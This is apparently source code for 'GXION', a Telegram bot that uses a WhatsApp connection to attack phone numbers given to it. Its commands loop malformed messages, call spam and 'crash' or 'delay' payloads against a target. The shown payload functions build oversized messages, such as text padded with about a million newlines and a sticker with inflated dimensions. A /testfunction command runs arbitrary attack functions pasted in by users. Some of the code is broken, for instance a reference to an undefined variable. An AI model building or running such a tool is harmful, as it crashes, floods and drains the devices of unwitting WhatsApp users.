<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: notif blank
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});
  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await ForceXFrezee(target)
    await sleep(2500);
   }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: notif blank
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("crashnotif", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashnotif 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: notif blank
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});
  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await blankon(sock, target)
    await sleep(2500);
   }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: notif blank
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("harddelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /harddelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: delay hard
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 70; i++) {
    await OtaxAyunBelovedX(sock, target)
    await sleep(4000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: delay hard
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("spamcall", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /spamcall 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: spam vcs
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await OfferPopup(sock, target);
    await sleep(400);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: spam vcs
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("spamfc", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /spamfc 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: for close spam
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5000; i++) {
    await SpamInvis(target)
    await sleep(5000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: for close spam
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("onehit", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /onehit 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: for close spam
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 9999; i++) {
    await SpamInvis(target)
    await sleep(5000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: for close spam
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("cekgbid", checkWhatsAppConnection, async (ctx) => {
  try {
    const text = ctx.message.text;
    const link = text.split(" ")[1];

    if (!link)
      return ctx.reply("🪧 ☇ Format: /cekgbid https://chat.whatsapp.com/XXXXX");

    const match = link.match(
      /chat\.whatsapp\.com\/([A-Za-z0-9_-]{10,})/
    );

    if (!match)
      return ctx.reply("❌ ☇ Link grup tidak valid");

    const inviteCode = match[1];

    if (!sock)
      return ctx.reply("❌ ☇ Socket belum siap");

    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupId = info.id;
    const subject = info.subject || "-";
    const owner = info.owner || "-";
    const size = info.size || 0;

    await ctx.reply(`
    <pre><code class="language-javascript">
╭═───⊱ GROUP INFO ───═⬡
│ ⸙ Name
│ᯓ➤ ${subject}
│ ⸙ Group ID
│ᯓ➤ ${groupId}
│ ⸙ Owner
│ᯓ➤ ${owner}
│ ⸙ Members
│ᯓ➤ ${size}
╰═─────────────═⬡</code></pre>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    ctx.reply("❌ ☇ Gagal mengambil Id grup");
  }
});

bot.command("buggroup", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /buggroup 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "g.us";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: for close gb
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await SpamInvisgb(target)
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: for close spam gb
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("bestdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /available 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: best delay
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 900; i++) {
    await GetZap(sock, target)
    await sleep(5000);
   }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: best delay
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("execution", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /execution 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: delay invis
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await VampDelayAudio(target)
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: delay invis
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delaymention", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delaymention 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: delay mention
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await Mentiondelays(sock, target, mention = true)
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: delay 
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("coredelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /coredelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: delay 
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await audiodelay(sock, target)
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: delay mention
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delicious", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delicious 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: fc one message 
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await amountOne(target)
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: fc one message 
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});


bot.command("iphonecrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /iphonecrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: IP crash invis
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await HyperSixty(sock, target) 
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: crash invis
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("nulldoc", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /nulldoc 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: null delay
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await Gyxlores(target)
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: null doc
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("buldozer", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /buldozer 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: Spong kuota
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await fvckData(sock, target)
    await fvckData(sock, target)
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: Spong kuota 
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delayfour", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delayfour 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: delay duration 
⌑ 📝 Status: <i>Process</i>
╘═——————————————═⬡
</blockquote>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      { text: "CEK TARGET", url: `https://wa.me/${q}` }
    ]]
  }
});

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await Killer(sock, target, mention = true)
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ 🧩 Target: <code>${q}</code>
⌑ 🚀 Type: delay duration
⌑ ✅ Status: <i>succes</i>
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 5 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 500))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendVideo(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><pre>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithVideo(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

//
async function LottieSticker(sock, target) {
  const Lottie = generateWAMessageFromContent( target,
    proto.Message.fromObject({
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/531060561_777860237969584_3957290612626270602_n.enc?ccb=11-4&oh=01_Q5Aa2QGtB4SUG4l9yG5qRj9bMU7v1XGepksJJ82cpY9eUJIngQ&oe=68C2923B&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Hu97Uc0XAUv82l507qXZfYF6dlrIB0/GKdB/nRvYpZw=",
            fileEncSha256: "YxrC0SoMBHP3msQt7SBUQepYDHH+l+PXfp1Nam7OhXo=",
            mediaKey: "Pbjsi5FmJ6PaTIHxd3MHS/i6WN/PKDHjFv/jbuaKM28=",
            mimetype: "application/was",
            height: 9999,
            width: 9999,
            directPath: "/v/t62.15575-24/531060561_777860237969584_3957290612626270602_n.enc?ccb=11-4&oh=01_Q5Aa2QGtB4SUG4l9yG5qRj9bMU7v1XGepksJJ82cpY9eUJIngQ&oe=68C2923B&_nc_sid=5e03e0",
            fileLength: "13801",
            mediaKeyTimestamp: "1755002437",
            isAnimated: true,
            stickerSentTs: "1755002439632",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              statusAttributionType: 2,
              forwardedAiBotMessageInfo: {
                botName: "Meta",
                botJid: "13135550002@s.whatsapp.net",
                creatorName: "Xatanical"
              }
            }
          }
        }
      }
    }), { participant: { jid: target } });

  await sock.relayMessage(target, Yjqx.message, {
    messageId: Lottie.key.id
  });
}

async function Killer(sock, target, mention = true) {
let extendMsg = {
         extendedTextMessage: {
            text: "Lixx boring",
            matchedText: "https://t.me/Lixxisheree2",
            description: "X" + "\x10".repeat(15000),
            title: "—!s lixx" + "\u0000" + "\n".repeat(1045000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWY